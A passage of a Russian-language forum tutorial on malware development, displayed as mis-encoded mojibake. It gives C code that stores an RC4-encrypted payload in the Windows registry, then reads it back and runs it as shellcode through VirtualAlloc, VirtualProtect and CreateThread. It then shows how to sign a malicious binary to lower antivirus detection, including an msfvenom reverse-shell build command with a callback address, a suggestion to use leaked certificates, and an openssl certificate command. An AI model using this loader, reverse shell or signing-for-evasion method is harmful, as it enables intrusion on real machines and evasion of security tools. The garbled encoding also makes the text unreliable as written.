–§—É–Ω–∫—Ü–∏—è RegGetValueA —Ç—Ä–µ–±—É–µ—Ç —É–∫–∞–∑–∞–Ω–∏—è –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞ –∏ –∑–Ω–∞—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –Ω—É–∂–Ω–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å, –∫–æ—Ç–æ—Ä—ã–º–∏ —è–≤–ª—è—é—Ç—Å—è REGISTRY –∏ REGSTRING —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
–í –ø—Ä–µ–¥—ã–¥—É—â–µ–π —Å—Ç–∞—Ç—å–µ  –º–æ–∂–Ω–æ –±—ã–ª–æ –ø–æ–ª—É—á–∞—Ç—å payload –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –≤ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö —á–∞—Å—Ç—è—Ö –ª—é–±–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞, –æ–¥–Ω–∞–∫–æ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å RegGetValueA —ç—Ç–æ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ, —Ç–∞–∫ –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—è –Ω–µ —á–∏—Ç–∞–µ—Ç –±–∞–π—Ç—ã –∫–∞–∫ –ø–æ—Ç–æ–∫ –¥–∞–Ω–Ω—ã—Ö, –∞ —Å–∫–æ—Ä–µ–µ —Ü–µ–ª–∏–∫–æ–º.<br />
<b>–í—Å–µ —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∑–Ω–∞–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ payload —è–≤–ª—è–µ—Ç—Å—è –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–º –ø—Ä–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —á—Ç–µ–Ω–∏—è.</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞
  [in, optional]      LPCSTR  lpSubKey, // –ü—É—Ç—å –∫ –∫–ª—é—á—É —Ä–µ–µ—Å—Ç—Ä–∞ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –∫–ª—é—á–∞, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ hkey
  [in, optional]      LPCSTR  lpValue,  // –ò–º—è –∑–Ω–∞—á–µ–Ω–∏—è –≤ —Ä–µ–µ—Å—Ç—Ä–µ
  [in, optional]      DWORD   dwFlags,  // –§–ª–∞–≥–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—é—Ç —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –±—É–¥–µ—Ç –∑–∞–ø—Ä–æ—à–µ–Ω–æ
  [out, optional]     LPDWORD pdwType,  // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∏—Ç –∫–æ–¥, —É–∫–∞–∑—ã–≤–∞—é—â–∏–π —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º –∑–Ω–∞—á–µ–Ω–∏–∏
  [out, optional]     PVOID   pvData,   // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –¥–∞–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
  [in, out, optional] LPDWORD pcbData   // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä pvData, –≤ –±–∞–π—Ç–∞—Ö
);</code></pre>
	</div>
</div><br />
–ß–µ—Ç–≤–µ—Ä—Ç—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è —Ç–∏–ø–∞ –¥–∞–Ω–Ω—ã—Ö, –æ–¥–Ω–∞–∫–æ —ç—Ç–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç RRF_RT_ANY, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç –ª—é–±–æ–π —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö. –í –∫–∞—á–µ—Å—Ç–≤–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã –º–æ–∂–Ω–æ –±—ã–ª–æ –±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å RRF_RT_REG_BINARY, —Ç–∞–∫ –∫–∞–∫ payload –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –¥–≤–æ–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –ù–∞–∫–æ–Ω–µ—Ü, payload —Å—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è –≤ pBytes, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª —Ä–∞–Ω–µ–µ –≤—ã–¥–µ–ª–µ–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º HeapAlloc.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &amp;dwBytesRead);</code></pre>
	</div>
</div><br />
<b>–ò—Å–ø–æ–ª–Ω–µ–Ω–∏–µ Payload</b><br />
<br />
–ü–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ payload –ø—Ä–æ—á–∏—Ç–∞–Ω –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞ –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–º –±—É—Ñ–µ—Ä–µ, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è RunShellcode –¥–ª—è –µ–≥–æ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –±—ã–ª–∞ –æ–ø–∏—Å–∞–Ω–∞ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏ –¥–ª—è –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ payload
    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf(&quot;[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ VirtualAlloc: %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[i] –í—ã–¥–µ–ª–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p \n&quot;, pShellcodeAddress);

    // –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –∞–¥—Ä–µ—Å
    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    // –û–±–Ω—É–ª–µ–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload
    memset(pDecryptedShellcode, &#039;\0&#039;, sDecryptedShellcodeSize);

    // –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–∞–º—è—Ç–∏ –¥–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ VirtualProtect: %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å ... &quot;);
    getchar();

    // –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–ª—è –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è payload
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–æ—Ç–æ–∫–∞ CreateThread: %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–ø–∏—Å—å –≤ —Ä–µ–µ—Å—Ç—Ä - –î–µ–º–æ </b><br />
<br />
–î–æ –∑–∞–ø—É—Å–∫–∞ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–æ–¥–∞, –ø–æ–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤—ã—à–µ, –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞ –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780767569.png"
		data-src="https://osint42.org/attachments/1746780767569-png.109/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780767569-png.109/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780767569.png"
			title="1746780767569.png"
			width="1067" height="323" loading="lazy" />
	</div><br />
<br />
–ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤–æ–µ —Å—Ç—Ä–æ–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —Ä–µ–µ—Å—Ç—Ä–∞ —Å payload, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–º —Å –ø–æ–º–æ—â—å—é RC4.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780775715.png"
		data-src="https://osint42.org/attachments/1746780775715-png.110/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780775715-png.110/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780775715.png"
			title="1746780775715.png"
			width="1265" height="448" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780782053.png"
		data-src="https://osint42.org/attachments/1746780782053-png.111/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780782053-png.111/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780782053.png"
			title="1746780782053.png"
			width="957" height="498" loading="lazy" />
	</div><br />
<br />
<b>–ß—Ç–µ–Ω–∏–µ –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞ - –î–µ–º–æ</b><br />
<br />
–ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç —Å —á—Ç–µ–Ω–∏—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780792025.png"
		data-src="https://osint42.org/attachments/1746780792025-png.112/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780792025-png.112/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780792025.png"
			title="1746780792025.png"
			width="1385" height="824" loading="lazy" />
	</div><br />
<br />
<b>–î–∞–ª–µ–µ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –±—É–¥–µ—Ç —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞—Ç—å payload.</b><br />
<div class="bbImageWrapper  js-lbImage" title="1746780807470.png"
		data-src="https://osint42.org/attachments/1746780807470-png.113/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780807470-png.113/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780807470.png"
			title="1746780807470.png"
			width="1249" height="712" loading="lazy" />
	</div><br />
<br />
–ò, –Ω–∞–∫–æ–Ω–µ—Ü, —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π payload –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780815569.png"
		data-src="https://osint42.org/attachments/1746780815569-png.114/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780815569-png.114/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780815569.png"
			title="1746780815569.png"
			width="1715" height="851" loading="lazy" />
	</div></div>
						

							<h2>–†–∞–∑–±–æ—Ä–∫–∞ —Å —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–ø–∏—Å—å—é –∑–≤–µ—Ä—å–∫–∞</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746780920824.png"
		data-src="https://osint42.org/attachments/1746780920824-png.115/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780920824-png.115/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780920824.png"
			title="1746780920824.png"
			width="720" height="304" loading="lazy" />
	</div><br />
<br />
–ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞, –æ–Ω —á–∞—Å—Ç–æ –ø–æ–¥–ø–∏—Å–∞–Ω –∫–æ–º–ø–∞–Ω–∏–µ–π –∫–∞–∫ —Å–ø–æ—Å–æ–± –¥–æ–∫–∞–∑–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é, —á—Ç–æ —ç—Ç–æ –Ω–∞–¥–µ–∂–Ω—ã–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª.<br />
<b><u>–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ —á—Ç–æ —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤—Å–µ —Ä–∞–≤–Ω–æ –±—É–¥—É—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª, –Ω–∞ –Ω–µ–≥–æ –±—ã–ª–∞ –±—ã –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å–ª–∏ –±—ã –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –Ω–µ –±—ã–ª –ø–æ–¥–ø–∏—Å–∞–Ω.</u></b><br />
<br />
–ü—Ä–µ–¥–ª–∞–≥–∞—é —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å —à–∞–≥–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, —á—Ç–æ –º–æ–∂–µ—Ç –ø–æ–≤—ã—Å–∏—Ç—å –µ–≥–æ –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç—å.<br />
<br />
–í —Å—Ç–∞—Ç—å–µ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –Ω–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º —Ñ–∞–π–ª–µ, —Å–æ–∑–¥–∞–Ω–Ω–æ–º —á–µ—Ä–µ–∑ Msfvenom: <b>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o mybin.exe<br />
<br />
–¢–µ—Å—Ç, –∫–∞–∫ –ø–æ–¥–ø–∏—Å—å –≤–ª–∏—è–µ—Ç –Ω–∞ –¥–µ—Ç–µ–∫—Ç:</b><br />
<br />
–ü–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –±—ã–ª –∑–∞–≥—Ä—É–∂–µ–Ω –Ω–∞ VirusTotal, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å —Å—Ç–µ–ø–µ–Ω—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –¥–æ –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
–°—Ç–µ–ø–µ–Ω—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –¥–æ–≤–æ–ª—å–Ω–æ –≤—ã—Å–æ–∫–∞:<b> 52 –∏–∑ 71</b> –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤ –æ—Ç–º–µ—Ç–∏–ª–∏ —Ñ–∞–π–ª –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780930586.png"
		data-src="https://osint42.org/attachments/1746780930586-png.116/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780930586-png.116/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780930586.png"
			title="1746780930586.png"
			width="1310" height="725" loading="lazy" />
	</div><br />
<br />
<b>–ó–Ω–∞—á–µ–Ω–∏–µ –ø–æ–¥–ø–∏—Å–∏ –¥–ª—è –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</b><br />
<br />
–ü–æ–¥–ø–∏—Å—å –∫–æ–¥–∞ –≤–∞–∂–Ω–æ, –ø–æ—Ç–æ–º—É —á—Ç–æ –æ–Ω–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å –¥–æ–≤–µ—Ä–∏—è –∫ –∏—Å—Ö–æ–¥–Ω–æ–º—É –∫–æ–¥—É. –û–¥–Ω–∞–∫–æ —ç—Ç–æ —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ —Å–∏—Å—Ç–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –æ–±–º–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π. –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ Msfvenom, –ø–æ–∑–≤–æ–ª—è—é—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞—Ç–µ–º –º–æ–≥—É—Ç –±—ã—Ç—å –ø–æ–¥–ø–∏—Å–∞–Ω—ã, —á—Ç–æ–±—ã —É–º–µ–Ω—å—à–∏—Ç—å –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –∏—Ö –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è.<br />
–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —ç—Ç–æ, –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –¥–æ–ª–∂–Ω—ã –æ—Å—Ç–∞–≤–∞—Ç—å—Å—è –Ω–∞—Å—Ç–æ—Ä–æ–∂–µ –∏ –Ω–µ –ø–æ–ª–∞–≥–∞—Ç—å—Å—è –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –Ω–∞ –ø–æ–¥–ø–∏—Å–∏ –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏ —Ñ–∞–π–ª–∞.<br />
<br />
<b>–ü–æ–ª—É—á–µ–Ω–∏–µ –°–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–ø–æ—Å–æ–±–æ–≤ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞:<br />
<ol>
<li data-xf-list-type="ol">–°–∞–º—ã–π –ø—Ä–µ–¥–ø–æ—á—Ç–∏—Ç–µ–ª—å–Ω—ã–π —Å–ø–æ—Å–æ–± - –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç —É –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞, —Ç–∞–∫–æ–≥–æ –∫–∞–∫ DigiCert.</li>
<li data-xf-list-type="ol">–ï—â–µ –æ–¥–Ω–∞ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∞–º–æ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç. –•–æ—Ç—è —ç—Ç–æ –Ω–µ –±—É–¥–µ—Ç —Ç–∞–∫–∏–º —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º, –∫–∞–∫ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –æ—Ç –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ —Ü–µ–Ω—Ç—Ä–∞, –≤ —Å—Ç–∞—Ç—å–µ –¥–∞–ª–µ–µ –±—É–¥–µ—Ç –ø–æ–∫–∞–∑–∞–Ω–æ, <b>—á—Ç–æ —ç—Ç–æ –≤—Å–µ —Ä–∞–≤–Ω–æ –º–æ–∂–µ—Ç –æ–∫–∞–∑–∞—Ç—å –≤–ª–∏—è–Ω–∏–µ –Ω–∞ —á–∞—Å—Ç–æ—Ç—É –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è.</b></li>
<li data-xf-list-type="ol">–ü–æ—Å–ª–µ–¥–Ω–∏–π –≤–∞—Ä–∏–∞–Ω—Ç - –Ω–∞–π—Ç–∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ —É—Ç–µ–∫–ª–∏ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –Ω–∞ Github).</li>
</ol><b>–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –°–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞</b><br />
<br />
–ü–æ–ø—Ä–æ–±—É–µ–º —Å–∞–º–∏ –ø–æ–¥–ø–∏—Å–∞—Ç—å —Å–≤–æ–π –±–∏–Ω–∞—Ä–Ω–∏–∫ –∏ –≥–ª—è–Ω–µ–º —á—Ç–æ –±—É–¥–µ—Ç.)<br />
–î–ª—è —ç—Ç–æ–≥–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è openssl, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ Kali Linux.<br />
<br />
–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365</code></pre>
	</div>
</div><br />
